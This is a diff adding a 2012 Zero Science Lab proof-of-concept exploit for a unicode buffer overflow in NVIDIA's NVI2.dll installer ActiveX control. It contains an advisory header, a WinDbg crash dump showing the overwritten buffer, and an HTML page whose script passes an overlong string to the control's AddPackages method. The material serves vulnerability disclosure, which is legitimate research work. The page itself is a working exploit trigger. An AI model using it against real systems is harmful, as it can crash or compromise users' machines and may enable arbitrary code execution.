@@ -1,0 +1,67 @@
+<!--
+
+NVIDIA Install Application 2.1002.85.551 (NVI2.dll) Unicode Buffer Overflow PoC
+
+
+Vendor: NVIDIA Corporation
+Product web page: http://www.nvidia.com
+Affected version: 2.1002.85.551 (Driver: 306.97)
+
+Summary: NVIDIA install core application for Windows.
+
+Desc: The vulnerability is caused due to a boundary error in NVI2.DLL
+when handling the value assigned to the 'pDirectory' string variable
+in the 'AddPackages' function and can be exploited to cause a unicode
+buffer overflow by inserting an overly long array of data which may
+lead to execution of arbitrary code.
+
+----------------------------------------------------------------------------------
+
+(19ac.21d4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=004142a0 ebx=01a83610 ecx=24194ce0 edx=00000002 esi=00000000 edi=00000000
+eip=5e26d7fc esp=0023ebe8 ebp=0023ec84 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+C:\Program Files\NVIDIA Corporation\Installer2\installer.2\NVI2.DLL - 
+NVI2!DllInstall+0xbf5c:
+5e26d7fc 8b37            mov     esi,dword ptr [edi]  ds:0023:00000000=????????
+0:000> d eax+40
+004142e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+004142f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414300  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414310  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414320  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414330  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414340  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00414350  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+----------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit
+
+- Drivers bundle used: 306.97-desktop-win8-win7-winvista-32bit-english-whql.exe
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+
+Advisory ID: ZSL-2012-5116
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5116.php
+
+
+02.12.2012
+
+-->
+
+
+<html><body>
+<object classid='clsid:A9C8F210-55EB-4849-8807-EC49C5389A79' id='attack' />
+<script>
+pDirectory=String(2068, "A")
+attack.AddPackages pDirectory
+</script>
+</body></html>
